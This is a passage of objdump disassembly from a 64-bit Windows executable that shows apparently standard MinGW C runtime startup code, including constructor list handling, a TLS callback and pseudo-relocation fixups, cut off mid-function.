   140001785:	48 83 c4 28          	add    $0x28,%rsp
   140001789:	c3                   	ret
   14000178a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001790:	56                   	push   %rsi
   140001791:	53                   	push   %rbx
   140001792:	48 83 ec 28          	sub    $0x28,%rsp
   140001796:	48 8b 15 c3 2c 00 00 	mov    0x2cc3(%rip),%rdx        # 0x140004460
   14000179d:	48 8b 02             	mov    (%rdx),%rax
   1400017a0:	89 c1                	mov    %eax,%ecx
   1400017a2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400017a5:	74 39                	je     0x1400017e0
   1400017a7:	85 c9                	test   %ecx,%ecx
   1400017a9:	74 20                	je     0x1400017cb
   1400017ab:	89 c8                	mov    %ecx,%eax
   1400017ad:	83 e9 01             	sub    $0x1,%ecx
   1400017b0:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
   1400017b4:	48 29 c8             	sub    %rcx,%rax
   1400017b7:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
   1400017bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400017c0:	ff 13                	call   *(%rbx)
   1400017c2:	48 83 eb 08          	sub    $0x8,%rbx
   1400017c6:	48 39 f3             	cmp    %rsi,%rbx
   1400017c9:	75 f5                	jne    0x1400017c0
   1400017cb:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x140001750
   1400017d2:	48 83 c4 28          	add    $0x28,%rsp
   1400017d6:	5b                   	pop    %rbx
   1400017d7:	5e                   	pop    %rsi
   1400017d8:	e9 63 fd ff ff       	jmp    0x140001540
   1400017dd:	0f 1f 00             	nopl   (%rax)
   1400017e0:	31 c0                	xor    %eax,%eax
   1400017e2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400017e8:	44 8d 40 01          	lea    0x1(%rax),%r8d
   1400017ec:	89 c1                	mov    %eax,%ecx
   1400017ee:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
   1400017f3:	4c 89 c0             	mov    %r8,%rax
   1400017f6:	75 f0                	jne    0x1400017e8
   1400017f8:	eb ad                	jmp    0x1400017a7
   1400017fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001800:	8b 05 2a 58 00 00    	mov    0x582a(%rip),%eax        # 0x140007030
   140001806:	85 c0                	test   %eax,%eax
   140001808:	74 06                	je     0x140001810
   14000180a:	c3                   	ret
   14000180b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001810:	c7 05 16 58 00 00 01 	movl   $0x1,0x5816(%rip)        # 0x140007030
   140001817:	00 00 00 
   14000181a:	e9 71 ff ff ff       	jmp    0x140001790
   14000181f:	90                   	nop
   140001820:	48 ff 25 b9 6b 00 00 	rex.W jmp *0x6bb9(%rip)        # 0x1400083e0
   140001827:	90                   	nop
   140001828:	90                   	nop
   140001829:	90                   	nop
   14000182a:	90                   	nop
   14000182b:	90                   	nop
   14000182c:	90                   	nop
   14000182d:	90                   	nop
   14000182e:	90                   	nop
   14000182f:	90                   	nop
   140001830:	48 83 ec 28          	sub    $0x28,%rsp
   140001834:	83 fa 03             	cmp    $0x3,%edx
   140001837:	74 17                	je     0x140001850
   140001839:	85 d2                	test   %edx,%edx
   14000183b:	74 13                	je     0x140001850
   14000183d:	b8 01 00 00 00       	mov    $0x1,%eax
   140001842:	48 83 c4 28          	add    $0x28,%rsp
   140001846:	c3                   	ret
   140001847:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000184e:	00 00 
   140001850:	e8 db 0a 00 00       	call   0x140002330
   140001855:	b8 01 00 00 00       	mov    $0x1,%eax
   14000185a:	48 83 c4 28          	add    $0x28,%rsp
   14000185e:	c3                   	ret
   14000185f:	90                   	nop
   140001860:	56                   	push   %rsi
   140001861:	53                   	push   %rbx
   140001862:	48 83 ec 28          	sub    $0x28,%rsp
   140001866:	48 8b 05 d3 2b 00 00 	mov    0x2bd3(%rip),%rax        # 0x140004440
   14000186d:	83 38 02             	cmpl   $0x2,(%rax)
   140001870:	74 06                	je     0x140001878
   140001872:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140001878:	83 fa 02             	cmp    $0x2,%edx
   14000187b:	74 13                	je     0x140001890
   14000187d:	83 fa 01             	cmp    $0x1,%edx
   140001880:	74 4e                	je     0x1400018d0
   140001882:	b8 01 00 00 00       	mov    $0x1,%eax
   140001887:	48 83 c4 28          	add    $0x28,%rsp
   14000188b:	5b                   	pop    %rbx
   14000188c:	5e                   	pop    %rsi
   14000188d:	c3                   	ret
   14000188e:	66 90                	xchg   %ax,%ax
   140001890:	48 8d 1d c9 77 00 00 	lea    0x77c9(%rip),%rbx        # 0x140009060
   140001897:	48 8d 35 c2 77 00 00 	lea    0x77c2(%rip),%rsi        # 0x140009060
   14000189e:	48 39 de             	cmp    %rbx,%rsi
   1400018a1:	74 df                	je     0x140001882
   1400018a3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400018a8:	48 8b 03             	mov    (%rbx),%rax
   1400018ab:	48 85 c0             	test   %rax,%rax
   1400018ae:	74 02                	je     0x1400018b2
   1400018b0:	ff d0                	call   *%rax
   1400018b2:	48 83 c3 08          	add    $0x8,%rbx
   1400018b6:	48 39 de             	cmp    %rbx,%rsi
   1400018b9:	75 ed                	jne    0x1400018a8
   1400018bb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400018c0:	48 83 c4 28          	add    $0x28,%rsp
   1400018c4:	5b                   	pop    %rbx
   1400018c5:	5e                   	pop    %rsi
   1400018c6:	c3                   	ret
   1400018c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400018ce:	00 00 
   1400018d0:	e8 5b 0a 00 00       	call   0x140002330
   1400018d5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400018da:	48 83 c4 28          	add    $0x28,%rsp
   1400018de:	5b                   	pop    %rbx
   1400018df:	5e                   	pop    %rsi
   1400018e0:	c3                   	ret
   1400018e1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400018e8:	00 00 00 00 
   1400018ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400018f0:	31 c0                	xor    %eax,%eax
   1400018f2:	c3                   	ret
   1400018f3:	90                   	nop
   1400018f4:	90                   	nop
   1400018f5:	90                   	nop
   1400018f6:	90                   	nop
   1400018f7:	90                   	nop
   1400018f8:	90                   	nop
   1400018f9:	90                   	nop
   1400018fa:	90                   	nop
   1400018fb:	90                   	nop
   1400018fc:	90                   	nop
   1400018fd:	90                   	nop
   1400018fe:	90                   	nop
   1400018ff:	90                   	nop
   140001900:	56                   	push   %rsi
   140001901:	53                   	push   %rbx
   140001902:	48 83 ec 78          	sub    $0x78,%rsp
   140001906:	0f 11 74 24 40       	movups %xmm6,0x40(%rsp)
   14000190b:	0f 11 7c 24 50       	movups %xmm7,0x50(%rsp)
   140001910:	44 0f 11 44 24 60    	movups %xmm8,0x60(%rsp)
   140001916:	83 39 06             	cmpl   $0x6,(%rcx)
   140001919:	0f 87 cd 00 00 00    	ja     0x1400019ec
   14000191f:	8b 01                	mov    (%rcx),%eax
   140001921:	48 8d 15 9c 29 00 00 	lea    0x299c(%rip),%rdx        # 0x1400042c4
   140001928:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   14000192c:	48 01 d0             	add    %rdx,%rax
   14000192f:	ff e0                	jmp    *%rax
   140001931:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001938:	48 8d 1d 37 29 00 00 	lea    0x2937(%rip),%rbx        # 0x140004276
   14000193f:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
   140001945:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
   14000194a:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
   14000194f:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   140001953:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001958:	e8 53 11 00 00       	call   0x140002ab0
   14000195d:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
   140001964:	49 89 d8             	mov    %rbx,%r8
   140001967:	48 8d 15 2a 29 00 00 	lea    0x292a(%rip),%rdx        # 0x140004298
   14000196e:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
   140001974:	48 89 c1             	mov    %rax,%rcx
   140001977:	49 89 f1             	mov    %rsi,%r9
   14000197a:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   140001980:	e8 cb 0e 00 00       	call   0x140002850
   140001985:	90                   	nop
   140001986:	0f 10 74 24 40       	movups 0x40(%rsp),%xmm6
   14000198b:	0f 10 7c 24 50       	movups 0x50(%rsp),%xmm7
   140001990:	31 c0                	xor    %eax,%eax
   140001992:	44 0f 10 44 24 60    	movups 0x60(%rsp),%xmm8
   140001998:	48 83 c4 78          	add    $0x78,%rsp
   14000199c:	5b                   	pop    %rbx
   14000199d:	5e                   	pop    %rsi
   14000199e:	c3                   	ret
   14000199f:	90                   	nop
   1400019a0:	48 8d 1d 09 28 00 00 	lea    0x2809(%rip),%rbx        # 0x1400041b0
   1400019a7:	eb 96                	jmp    0x14000193f
   1400019a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400019b0:	48 8d 1d 39 28 00 00 	lea    0x2839(%rip),%rbx        # 0x1400041f0
   1400019b7:	eb 86                	jmp    0x14000193f
   1400019b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400019c0:	48 8d 1d 09 28 00 00 	lea    0x2809(%rip),%rbx        # 0x1400041d0
   1400019c7:	e9 73 ff ff ff       	jmp    0x14000193f
   1400019cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400019d0:	48 8d 1d 69 28 00 00 	lea    0x2869(%rip),%rbx        # 0x140004240
   1400019d7:	e9 63 ff ff ff       	jmp    0x14000193f
   1400019dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400019e0:	48 8d 1d 31 28 00 00 	lea    0x2831(%rip),%rbx        # 0x140004218
   1400019e7:	e9 53 ff ff ff       	jmp    0x14000193f
   1400019ec:	48 8d 1d ad 27 00 00 	lea    0x27ad(%rip),%rbx        # 0x1400041a0
   1400019f3:	e9 47 ff ff ff       	jmp    0x14000193f
   1400019f8:	90                   	nop
   1400019f9:	90                   	nop
   1400019fa:	90                   	nop
   1400019fb:	90                   	nop
   1400019fc:	90                   	nop
   1400019fd:	90                   	nop
   1400019fe:	90                   	nop
   1400019ff:	90                   	nop
   140001a00:	31 c0                	xor    %eax,%eax
   140001a02:	c3                   	ret
   140001a03:	90                   	nop
   140001a04:	90                   	nop
   140001a05:	90                   	nop
   140001a06:	90                   	nop
   140001a07:	90                   	nop
   140001a08:	90                   	nop
   140001a09:	90                   	nop
   140001a0a:	90                   	nop
   140001a0b:	90                   	nop
   140001a0c:	90                   	nop
   140001a0d:	90                   	nop
   140001a0e:	90                   	nop
   140001a0f:	90                   	nop
   140001a10:	db e3                	fninit
   140001a12:	c3                   	ret
   140001a13:	90                   	nop
   140001a14:	90                   	nop
   140001a15:	90                   	nop
   140001a16:	90                   	nop
   140001a17:	90                   	nop
   140001a18:	90                   	nop
   140001a19:	90                   	nop
   140001a1a:	90                   	nop
   140001a1b:	90                   	nop
   140001a1c:	90                   	nop
   140001a1d:	90                   	nop
   140001a1e:	90                   	nop
   140001a1f:	90                   	nop
   140001a20:	41 54                	push   %r12
   140001a22:	53                   	push   %rbx
   140001a23:	48 83 ec 38          	sub    $0x38,%rsp
   140001a27:	49 89 cc             	mov    %rcx,%r12
   140001a2a:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140001a2f:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001a34:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140001a39:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   140001a3e:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140001a43:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001a48:	e8 63 10 00 00       	call   0x140002ab0
   140001a4d:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
   140001a53:	ba 01 00 00 00       	mov    $0x1,%edx
   140001a58:	48 8d 0d 81 28 00 00 	lea    0x2881(%rip),%rcx        # 0x1400042e0
   140001a5f:	49 89 c1             	mov    %rax,%r9
   140001a62:	e8 79 10 00 00       	call   0x140002ae0
   140001a67:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140001a6c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001a71:	e8 3a 10 00 00       	call   0x140002ab0
   140001a76:	4c 89 e2             	mov    %r12,%rdx
   140001a79:	48 89 c1             	mov    %rax,%rcx
   140001a7c:	49 89 d8             	mov    %rbx,%r8
   140001a7f:	e8 ac 0d 00 00       	call   0x140002830
   140001a84:	e8 cf 10 00 00       	call   0x140002b58
   140001a89:	90                   	nop
   140001a8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001a90:	41 54                	push   %r12
   140001a92:	55                   	push   %rbp
   140001a93:	57                   	push   %rdi
   140001a94:	56                   	push   %rsi
   140001a95:	53                   	push   %rbx
   140001a96:	48 83 ec 50          	sub    $0x50,%rsp
   140001a9a:	48 63 3d 03 56 00 00 	movslq 0x5603(%rip),%rdi        # 0x1400070a4
   140001aa1:	49 89 cc             	mov    %rcx,%r12
   140001aa4:	48 89 d6             	mov    %rdx,%rsi
   140001aa7:	4c 89 c3             	mov    %r8,%rbx
   140001aaa:	85 ff                	test   %edi,%edi
   140001aac:	0f 8e 8e 01 00 00    	jle    0x140001c40
   140001ab2:	48 8b 05 ef 55 00 00 	mov    0x55ef(%rip),%rax        # 0x1400070a8
   140001ab9:	31 c9                	xor    %ecx,%ecx
   140001abb:	48 83 c0 18          	add    $0x18,%rax
   140001abf:	90                   	nop
   140001ac0:	48 8b 10             	mov    (%rax),%rdx
   140001ac3:	49 39 d4             	cmp    %rdx,%r12
   140001ac6:	72 14                	jb     0x140001adc
   140001ac8:	4c 8b 40 08          	mov    0x8(%rax),%r8
   140001acc:	45 8b 40 08          	mov    0x8(%r8),%r8d
   140001ad0:	4c 01 c2             	add    %r8,%rdx
   140001ad3:	49 39 d4             	cmp    %rdx,%r12
   140001ad6:	0f 82 8b 00 00 00    	jb     0x140001b67
   140001adc:	83 c1 01             	add    $0x1,%ecx
   140001adf:	48 83 c0 28          	add    $0x28,%rax
   140001ae3:	39 f9                	cmp    %edi,%ecx
   140001ae5:	75 d9                	jne    0x140001ac0
   140001ae7:	4c 89 e1             	mov    %r12,%rcx
   140001aea:	e8 51 0a 00 00       	call   0x140002540
   140001aef:	48 89 c5             	mov    %rax,%rbp
   140001af2:	48 85 c0             	test   %rax,%rax
   140001af5:	0f 84 a2 01 00 00    	je     0x140001c9d
   140001afb:	48 8b 05 a6 55 00 00 	mov    0x55a6(%rip),%rax        # 0x1400070a8
   140001b02:	48 8d 3c bf          	lea    (%rdi,%rdi,4),%rdi
   140001b06:	48 c1 e7 03          	shl    $0x3,%rdi
   140001b0a:	48 01 f8             	add    %rdi,%rax
   140001b0d:	48 89 68 20          	mov    %rbp,0x20(%rax)
   140001b11:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001b17:	e8 54 0b 00 00       	call   0x140002670
   140001b1c:	8b 4d 0c             	mov    0xc(%rbp),%ecx
   140001b1f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001b24:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140001b2a:	48 01 c1             	add    %rax,%rcx
   140001b2d:	48 8b 05 74 55 00 00 	mov    0x5574(%rip),%rax        # 0x1400070a8
   140001b34:	48 89 4c 38 18       	mov    %rcx,0x18(%rax,%rdi,1)
   140001b39:	ff 15 51 68 00 00    	call   *0x6851(%rip)        # 0x140008390
   140001b3f:	48 85 c0             	test   %rax,%rax
   140001b42:	0f 84 3a 01 00 00    	je     0x140001c82
   140001b48:	8b 44 24 44          	mov    0x44(%rsp),%eax
   140001b4c:	8d 50 c0             	lea    -0x40(%rax),%edx
   140001b4f:	83 e2 bf             	and    $0xffffffbf,%edx
   140001b52:	74 0c                	je     0x140001b60
   140001b54:	8d 50 fc             	lea    -0x4(%rax),%edx
   140001b57:	83 e2 fb             	and    $0xfffffffb,%edx
   140001b5a:	0f 85 90 00 00 00    	jne    0x140001bf0
   140001b60:	83 05 3d 55 00 00 01 	addl   $0x1,0x553d(%rip)        # 0x1400070a4
   140001b67:	83 fb 08             	cmp    $0x8,%ebx
   140001b6a:	73 2c                	jae    0x140001b98
   140001b6c:	f6 c3 04             	test   $0x4,%bl
   140001b6f:	0f 85 db 00 00 00    	jne    0x140001c50
   140001b75:	85 db                	test   %ebx,%ebx
   140001b77:	74 10                	je     0x140001b89
   140001b79:	0f b6 06             	movzbl (%rsi),%eax
   140001b7c:	41 88 04 24          	mov    %al,(%r12)
   140001b80:	f6 c3 02             	test   $0x2,%bl
   140001b83:	0f 85 e7 00 00 00    	jne    0x140001c70
   140001b89:	48 83 c4 50          	add    $0x50,%rsp
   140001b8d:	5b                   	pop    %rbx
   140001b8e:	5e                   	pop    %rsi
   140001b8f:	5f                   	pop    %rdi
   140001b90:	5d                   	pop    %rbp
   140001b91:	41 5c                	pop    %r12
   140001b93:	c3                   	ret
   140001b94:	0f 1f 40 00          	nopl   0x0(%rax)
   140001b98:	48 8b 06             	mov    (%rsi),%rax
   140001b9b:	49 8d 4c 24 08       	lea    0x8(%r12),%rcx
   140001ba0:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
   140001ba4:	49 89 04 24          	mov    %rax,(%r12)
   140001ba8:	89 d8                	mov    %ebx,%eax
   140001baa:	48 8b 54 06 f8       	mov    -0x8(%rsi,%rax,1),%rdx
   140001baf:	49 89 54 04 f8       	mov    %rdx,-0x8(%r12,%rax,1)
   140001bb4:	49 29 cc             	sub    %rcx,%r12
   140001bb7:	44 01 e3             	add    %r12d,%ebx
   140001bba:	4c 29 e6             	sub    %r12,%rsi
   140001bbd:	83 e3 f8             	and    $0xfffffff8,%ebx
   140001bc0:	83 fb 08             	cmp    $0x8,%ebx
   140001bc3:	72 c4                	jb     0x140001b89
   140001bc5:	83 e3 f8             	and    $0xfffffff8,%ebx
   140001bc8:	31 c0                	xor    %eax,%eax
   140001bca:	89 c2                	mov    %eax,%edx
   140001bcc:	83 c0 08             	add    $0x8,%eax
   140001bcf:	4c 8b 04 16          	mov    (%rsi,%rdx,1),%r8
   140001bd3:	4c 89 04 11          	mov    %r8,(%rcx,%rdx,1)
   140001bd7:	39 d8                	cmp    %ebx,%eax
   140001bd9:	72 ef                	jb     0x140001bca
   140001bdb:	48 83 c4 50          	add    $0x50,%rsp
   140001bdf:	5b                   	pop    %rbx
   140001be0:	5e                   	pop    %rsi
   140001be1:	5f                   	pop    %rdi
   140001be2:	5d                   	pop    %rbp
   140001be3:	41 5c                	pop    %r12
   140001be5:	c3                   	ret
   140001be6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001bed:	00 00 00 
   140001bf0:	83 f8 02             	cmp    $0x2,%eax
   140001bf3:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001bf8:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140001bfd:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001c03:	b8 40 00 00 00       	mov    $0x40,%eax
   140001c08:	44 0f 45 c0          	cmovne %eax,%r8d
   140001c0c:	48 03 3d 95 54 00 00 	add    0x5495(%rip),%rdi        # 0x1400070a8
   140001c13:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140001c17:	49 89 f9             	mov    %rdi,%r9
   140001c1a:	48 89 57 10          	mov    %rdx,0x10(%rdi)
   140001c1e:	ff 15 64 67 00 00    	call   *0x6764(%rip)        # 0x140008388
   140001c24:	85 c0                	test   %eax,%eax
   140001c26:	0f 85 34 ff ff ff    	jne    0x140001b60
   140001c2c:	ff 15 f6 66 00 00    	call   *0x66f6(%rip)        # 0x140008328
   140001c32:	48 8d 0d 1f 27 00 00 	lea    0x271f(%rip),%rcx        # 0x140004358
   140001c39:	89 c2                	mov    %eax,%edx
   140001c3b:	e8 e0 fd ff ff       	call   0x140001a20
   140001c40:	31 ff                	xor    %edi,%edi
   140001c42:	e9 a0 fe ff ff       	jmp    0x140001ae7
   140001c47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001c4e:	00 00 
   140001c50:	8b 06                	mov    (%rsi),%eax
   140001c52:	89 db                	mov    %ebx,%ebx
   140001c54:	41 89 04 24          	mov    %eax,(%r12)
   140001c58:	8b 44 1e fc          	mov    -0x4(%rsi,%rbx,1),%eax
   140001c5c:	41 89 44 1c fc       	mov    %eax,-0x4(%r12,%rbx,1)
   140001c61:	e9 23 ff ff ff       	jmp    0x140001b89
   140001c66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001c6d:	00 00 00 
   140001c70:	89 db                	mov    %ebx,%ebx
   140001c72:	0f b7 44 1e fe       	movzwl -0x2(%rsi,%rbx,1),%eax
   140001c77:	66 41 89 44 1c fe    	mov    %ax,-0x2(%r12,%rbx,1)
   140001c7d:	e9 07 ff ff ff       	jmp    0x140001b89
   140001c82:	48 8b 05 1f 54 00 00 	mov    0x541f(%rip),%rax        # 0x1400070a8
   140001c89:	8b 55 08             	mov    0x8(%rbp),%edx
   140001c8c:	48 8d 0d 8d 26 00 00 	lea    0x268d(%rip),%rcx        # 0x140004320
   140001c93:	4c 8b 44 38 18       	mov    0x18(%rax,%rdi,1),%r8
   140001c98:	e8 83 fd ff ff       	call   0x140001a20
   140001c9d:	4c 89 e2             	mov    %r12,%rdx
   140001ca0:	48 8d 0d 59 26 00 00 	lea    0x2659(%rip),%rcx        # 0x140004300
   140001ca7:	e8 74 fd ff ff       	call   0x140001a20
   140001cac:	90                   	nop
   140001cad:	0f 1f 00             	nopl   (%rax)
   140001cb0:	55                   	push   %rbp
   140001cb1:	41 57                	push   %r15
   140001cb3:	41 56                	push   %r14
   140001cb5:	41 55                	push   %r13
   140001cb7:	41 54                	push   %r12
   140001cb9:	57                   	push   %rdi
   140001cba:	56                   	push   %rsi
   140001cbb:	53                   	push   %rbx
   140001cbc:	48 83 ec 38          	sub    $0x38,%rsp
   140001cc0:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140001cc7:	00 
   140001cc8:	8b 35 d2 53 00 00    	mov    0x53d2(%rip),%esi        # 0x1400070a0
   140001cce:	85 f6                	test   %esi,%esi
   140001cd0:	74 16                	je     0x140001ce8
   140001cd2:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
   140001cd6:	5b                   	pop    %rbx
   140001cd7:	5e                   	pop    %rsi
   140001cd8:	5f                   	pop    %rdi
   140001cd9:	41 5c                	pop    %r12
   140001cdb:	41 5d                	pop    %r13
   140001cdd:	41 5e                	pop    %r14
   140001cdf:	41 5f                	pop    %r15
   140001ce1:	5d                   	pop    %rbp
   140001ce2:	c3                   	ret
   140001ce3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ce8:	c7 05 ae 53 00 00 01 	movl   $0x1,0x53ae(%rip)        # 0x1400070a0
   140001cef:	00 00 00 
   140001cf2:	e8 d9 08 00 00       	call   0x1400025d0
   140001cf7:	48 98                	cltq
   140001cf9:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140001cfd:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   140001d04:	00 
   140001d05:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140001d09:	e8 e2 0a 00 00       	call   0x1400027f0
   140001d0e:	4c 8b 25 5b 27 00 00 	mov    0x275b(%rip),%r12        # 0x140004470
   140001d15:	48 8b 1d 64 27 00 00 	mov    0x2764(%rip),%rbx        # 0x140004480
   140001d1c:	c7 05 7e 53 00 00 00 	movl   $0x0,0x537e(%rip)        # 0x1400070a4
   140001d23:	00 00 00 
   140001d26:	48 29 c4             	sub    %rax,%rsp
   140001d29:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140001d2e:	48 89 05 73 53 00 00 	mov    %rax,0x5373(%rip)        # 0x1400070a8
   140001d35:	4c 89 e0             	mov    %r12,%rax
   140001d38:	48 29 d8             	sub    %rbx,%rax
   140001d3b:	48 83 f8 07          	cmp    $0x7,%rax
   140001d3f:	7e 91                	jle    0x140001cd2
   140001d41:	8b 13                	mov    (%rbx),%edx
   140001d43:	48 83 f8 0b          	cmp    $0xb,%rax
   140001d47:	0f 8f 4b 01 00 00    	jg     0x140001e98
   140001d4d:	85 d2                	test   %edx,%edx
   140001d4f:	0f 85 cb 01 00 00    	jne    0x140001f20
   140001d55:	8b 43 04             	mov    0x4(%rbx),%eax
   140001d58:	85 c0                	test   %eax,%eax
   140001d5a:	0f 85 c0 01 00 00    	jne    0x140001f20
   140001d60:	8b 53 08             	mov    0x8(%rbx),%edx
   140001d63:	83 fa 01             	cmp    $0x1,%edx
   140001d66:	0f 85 1c 02 00 00    	jne    0x140001f88
   140001d6c:	48 83 c3 0c          	add    $0xc,%rbx
   140001d70:	4c 8d 7d a8          	lea    -0x58(%rbp),%r15
   140001d74:	4c 8b 2d 25 27 00 00 	mov    0x2725(%rip),%r13        # 0x1400044a0
   140001d7b:	49 be 00 00 00 00 ff 	movabs $0xffffffff00000000,%r14
   140001d82:	ff ff ff 
   140001d85:	4c 39 e3             	cmp    %r12,%rbx
   140001d88:	72 3f                	jb     0x140001dc9
   140001d8a:	e9 43 ff ff ff       	jmp    0x140001cd2
   140001d8f:	90                   	nop
   140001d90:	44 0f b6 01          	movzbl (%rcx),%r8d
   140001d94:	4c 89 ff             	mov    %r15,%rdi
   140001d97:	4d 89 c2             	mov    %r8,%r10
   140001d9a:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
   140001da1:	45 84 c0             	test   %r8b,%r8b
   140001da4:	4d 0f 48 c2          	cmovs  %r10,%r8
   140001da8:	49 29 d0             	sub    %rdx,%r8
   140001dab:	4c 89 fa             	mov    %r15,%rdx
   140001dae:	4d 01 c8             	add    %r9,%r8
   140001db1:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
   140001db5:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001dbb:	e8 d0 fc ff ff       	call   0x140001a90
   140001dc0:	48 83 c3 0c          	add    $0xc,%rbx
   140001dc4:	4c 39 e3             	cmp    %r12,%rbx
   140001dc7:	73 77                	jae    0x140001e40
   140001dc9:	8b 13                	mov    (%rbx),%edx
   140001dcb:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140001dce:	44 0f b6 43 08       	movzbl 0x8(%rbx),%r8d
   140001dd3:	4c 01 ea             	add    %r13,%rdx
   140001dd6:	4c 01 e9             	add    %r13,%rcx
   140001dd9:	4c 8b 0a             	mov    (%rdx),%r9
   140001ddc:	41 83 f8 20          	cmp    $0x20,%r8d
   140001de0:	0f 84 0a 01 00 00    	je     0x140001ef0
   140001de6:	0f 87 d4 00 00 00    	ja     0x140001ec0
   140001dec:	41 83 f8 08          	cmp    $0x8,%r8d
   140001df0:	74 9e                	je     0x140001d90
   140001df2:	41 83 f8 10          	cmp    $0x10,%r8d
   140001df6:	0f 85 75 01 00 00    	jne    0x140001f71
   140001dfc:	44 0f b7 01          	movzwl (%rcx),%r8d
   140001e00:	4c 89 ff             	mov    %r15,%rdi
   140001e03:	4d 89 c2             	mov    %r8,%r10
   140001e06:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
   140001e0d:	66 45 85 c0          	test   %r8w,%r8w
   140001e11:	4d 0f 48 c2          	cmovs  %r10,%r8
   140001e15:	48 83 c3 0c          	add    $0xc,%rbx
   140001e19:	49 29 d0             	sub    %rdx,%r8
   140001e1c:	4c 89 fa             	mov    %r15,%rdx
   140001e1f:	4d 01 c8             	add    %r9,%r8
   140001e22:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
   140001e26:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001e2c:	e8 5f fc ff ff       	call   0x140001a90
   140001e31:	4c 39 e3             	cmp    %r12,%rbx
   140001e34:	72 93                	jb     0x140001dc9
   140001e36:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001e3d:	00 00 00 
   140001e40:	8b 05 5e 52 00 00    	mov    0x525e(%rip),%eax        # 0x1400070a4
   140001e46:	85 c0                	test   %eax,%eax
   140001e48:	0f 8e 84 fe ff ff    	jle    0x140001cd2
   140001e4e:	4c 8b 25 33 65 00 00 	mov    0x6533(%rip),%r12        # 0x140008388
   140001e55:	31 db                	xor    %ebx,%ebx
   140001e57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001e5e:	00 00 
   140001e60:	48 8b 05 41 52 00 00 	mov    0x5241(%rip),%rax        # 0x1400070a8
   140001e67:	48 01 d8             	add    %rbx,%rax
   140001e6a:	44 8b 00             	mov    (%rax),%r8d
   140001e6d:	45 85 c0             	test   %r8d,%r8d
   140001e70:	74 0e                	je     0x140001e80
   140001e72:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140001e76:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001e7a:	49 89 f9             	mov    %rdi,%r9
   140001e7d:	41 ff d4             	call   *%r12
   140001e80:	83 c6 01             	add    $0x1,%esi
   140001e83:	48 83 c3 28          	add    $0x28,%rbx
   140001e87:	3b 35 17 52 00 00    	cmp    0x5217(%rip),%esi        # 0x1400070a4
   140001e8d:	7c d1                	jl     0x140001e60
